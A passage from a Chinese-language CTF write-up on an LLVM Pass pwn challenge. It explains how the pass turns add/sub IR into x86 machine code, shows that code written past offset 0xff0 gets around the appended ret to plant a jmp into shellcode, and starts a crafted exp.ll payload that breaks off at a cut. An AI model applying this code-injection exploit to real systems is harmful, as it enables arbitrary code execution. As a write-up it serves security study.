<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143424721.png" alt="image-20230831143424721"></p>
</li>
<li><p><code>arg0</code>为变量时，将<code>arg0</code>放<code>入stackLLvmValueVar</code>，<code>stackIntVar_top</code>放入<code>stackIntVar</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143518100.png" alt="image-20230831143518100"></p>
</li>
<li><p>指令为<code>sub</code>时，<code>stackIntVar_top = -stackIntVar_top</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143830853.png" alt="image-20230831143830853"></p>
</li>
<li><p><code>arg1</code>为常量时，且为1或-1时，调用<code>writeInc</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144224528.png" alt="image-20230831144224528"></p>
<p><code>stackIntVar_top</code>为1时，写入<code>inc rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142327635.png" alt="image-20230831142327635"><code>stackIntVar_top</code>不为1时，写入<code>dec rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142406119.png" alt="image-20230831142406119"></p>
<p><code>arg0</code>为常量不为1或-1时，调用<code>writeMovImm64</code>函数，写入<code>\x48\xbb + arg0*stackIntVar_top </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142605020.png" alt="image-20230831142605020"></p>
<p>调用<code>writeOpReg</code>函数，写入<code>\x48\x01\xd8</code>，即为<code>add rax,rbx</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143318448.png" alt="image-20230831143318448"></p>
</li>
<li><p><code>arg1</code>为函数参数时，<code>this[12]</code>赋值为<code>stackIntVar_top</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144329204.png" alt="image-20230831144329204"></p>
</li>
<li><p><code>arg1</code>为本地变量时 ，将<code>arg1</code>放<code>入stackLLvmValueVar</code>，<code>stackIntVar_top</code>放入<code>stackIntVar</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144410252.png" alt="image-20230831144410252"></p>
</li>
</ul>
</li>
<li><p>跳出<code>while</code>循环后对栈进行析构操作</p>
</li>
</ul>
</li>
</ul>

        <h4 id="执行指令"   >
          <a href="#执行指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#执行指令" class="headerlink" title="执行指令"></a>执行指令</h4>
      <p>退出<code>handle</code>函数后，会赋予<code>this[4]</code>可读可执行的权限，并且进入<code>callCode</code>进行执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831145139588.png" alt="image-20230831145139588"></p>
<p>这里注意一下<code>this[4]</code>和<code>this[5]</code>最开始存放的是同一个指针，所以我们写入的地方就是<code>this[4]</code>存放的指针位置处。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831145218292.png" alt="image-20230831145218292"></p>
<p>漏洞点发生在整体的逻辑上，调试可知，最开始的<code>this[4]</code>是本身完全被初始化为<code>ret</code>指令，并且长度超过<code>0xff0</code>，那么当通过<code>while</code>循环写入超过<code>0xff0</code>长度的指令时</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831150630034.png" alt="image-20230831150630034"></p>
<p>那么无论最后有没有被写入<code>ret</code>再退出循环，都会存在<code>ret</code>指令，从而安全退出，执行到下一个函数进行解析。这样就可以在第一个函数中超出<code>0xff0</code>长度写入<code>jmp</code>指令，使用形如<code>add var,con</code>形式如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xff0 mov raxabs,xx</span><br><span class="line">0xff8 add rax,rbx</span><br><span class="line">0xffb mov raxabx,yyyy</span><br><span class="line">0x1000 ret</span><br></pre></td></tr></table></div></figure>

<p>其中<code>yyyy</code>数据的<code>0xffe</code>地址开始处就包含<code>jmp</code>指令</p>
<p>第二个函数中写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xff0 mov raxabs,xx</span><br><span class="line">0xff8 add rax,rbx</span><br><span class="line">0xffb dec rax</span><br></pre></td></tr></table></div></figure>

<p>这样总的就是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xff0 mov raxabs,xx</span><br><span class="line">0xff8 add rax,rbx</span><br><span class="line">0xffb dec rax</span><br><span class="line">0xffe jmp xxx</span><br><span class="line">0x1000 ret</span><br></pre></td></tr></table></div></figure>

<p>顺利绕过末尾补<code>ret</code>进入<code>jmp</code>跳转。</p>
<p>随后通过之前的<code>mov raxabs,xxxx</code>中的<code>xxxx</code>八个字节，完成赋值加连环跳转的工作，从而执行真正的<code>shellcode</code></p>

        <h3 id="漏洞利用-3"   >
          <a href="#漏洞利用-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p>就直接用<code>winmt</code>师傅的<code>exp</code>了</p>
<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9" >原创] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>需要注意的是，由于使用的只能是<code>add/sub</code>指令，所以需要通过空函数的<code>exp.c</code>生成<code>exp.ll</code>，然后再在里面补充对应的<code>add</code>指令即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;exp.c&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;exp.c&quot;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"> </span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @payload1(i64 %<span class="number">0</span>) #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">2</span> = add nsw i64 %<span class="number">0</span>, <span class="number">58603</span></span><br><span class="line">  %<span class="number">3</span> = add nsw i64 %<span class="number">2</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">4</span> = add nsw i64 %<span class="number">3</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">5</span> = add nsw i64 %<span class="number">4</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">6</span> = add nsw i64 %<span class="number">5</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">7</span> = add nsw i64 %<span class="number">6</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">8</span> = add nsw i64 %<span class="number">7</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">9</span> = add nsw i64 %<span class="number">8</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">10</span> = add nsw i64 %<span class="number">9</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">11</span> = add nsw i64 %<span class="number">10</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">12</span> = add nsw i64 %<span class="number">11</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">13</span> = add nsw i64 %<span class="number">12</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">14</span> = add nsw i64 %<span class="number">13</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">15</span> = add nsw i64 %<span class="number">14</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">16</span> = add nsw i64 %<span class="number">15</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">17</span> = add nsw i64 %<span class="number">16</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">18</span> = add nsw i64 %<span class="number">17</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">19</span> = add nsw i64 %<span class="number">18</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">20</span> = add nsw i64 %<span class="number">19</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">21</span> = add nsw i64 %<span class="number">20</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">22</span> = add nsw i64 %<span class="number">21</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">23</span> = add nsw i64 %<span class="number">22</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">24</span> = add nsw i64 %<span class="number">23</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">25</span> = add nsw i64 %<span class="number">24</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">26</span> = add nsw i64 %<span class="number">25</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">27</span> = add nsw i64 %<span class="number">26</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">28</span> = add nsw i64 %<span class="number">27</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">29</span> = add nsw i64 %<span class="number">28</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">30</span> = add nsw i64 %<span class="number">29</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">31</span> = add nsw i64 %<span class="number">30</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">32</span> = add nsw i64 %<span class="number">31</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">33</span> = add nsw i64 %<span class="number">32</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">34</span> = add nsw i64 %<span class="number">33</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">35</span> = add nsw i64 %<span class="number">34</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">36</span> = add nsw i64 %<span class="number">35</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">37</span> = add nsw i64 %<span class="number">36</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">38</span> = add nsw i64 %<span class="number">37</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">39</span> = add nsw i64 %<span class="number">38</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">40</span> = add nsw i64 %<span class="number">39</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">41</span> = add nsw i64 %<span class="number">40</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">42</span> = add nsw i64 %<span class="number">41</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">43</span> = add nsw i64 %<span class="number">42</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">44</span> = add nsw i64 %<span class="number">43</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">45</span> = add nsw i64 %<span class="number">44</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">46</span> = add nsw i64 %<span class="number">45</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">47</span> = add nsw i64 %<span class="number">46</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">48</span> = add nsw i64 %<span class="number">47</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">49</span> = add nsw i64 %<span class="number">48</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">50</span> = add nsw i64 %<span class="number">49</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">51</span> = add nsw i64 %<span class="number">50</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">52</span> = add nsw i64 %<span class="number">51</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">53</span> = add nsw i64 %<span class="number">52</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">54</span> = add nsw i64 %<span class="number">53</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">55</span> = add nsw i64 %<span class="number">54</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">56</span> = add nsw i64 %<span class="number">55</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">57</span> = add nsw i64 %<span class="number">56</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">58</span> = add nsw i64 %<span class="number">57</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">59</span> = add nsw i64 %<span class="number">58</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">60</span> = add nsw i64 %<span class="number">59</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">61</span> = add nsw i64 %<span class="number">60</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">62</span> = add nsw i64 %<span class="number">61</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">63</span> = add nsw i64 %<span class="number">62</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">64</span> = add nsw i64 %<span class="number">63</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">65</span> = add nsw i64 %<span class="number">64</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">66</span> = add nsw i64 %<span class="number">65</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">67</span> = add nsw i64 %<span class="number">66</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">68</span> = add nsw i64 %<span class="number">67</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">69</span> = add nsw i64 %<span class="number">68</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">70</span> = add nsw i64 %<span class="number">69</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">71</span> = add nsw i64 %<span class="number">70</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">72</span> = add nsw i64 %<span class="number">71</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">73</span> = add nsw i64 %<span class="number">72</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">74</span> = add nsw i64 %<span class="number">73</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">75</span> = add nsw i64 %<span class="number">74</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">76</span> = add nsw i64 %<span class="number">75</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">77</span> = add nsw i64 %<span class="number">76</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">78</span> = add nsw i64 %<span class="number">77</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">79</span> = add nsw i64 %<span class="number">78</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">80</span> = add nsw i64 %<span class="number">79</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">81</span> = add nsw i64 %<span class="number">80</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">82</span> = add nsw i64 %<span class="number">81</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">83</span> = add nsw i64 %<span class="number">82</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">84</span> = add nsw i64 %<span class="number">83</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">85</span> = add nsw i64 %<span class="number">84</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">86</span> = add nsw i64 %<span class="number">85</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">87</span> = add nsw i64 %<span class="number">86</span>, <span class="number">1024</span></span><br><span class="line">  %<span 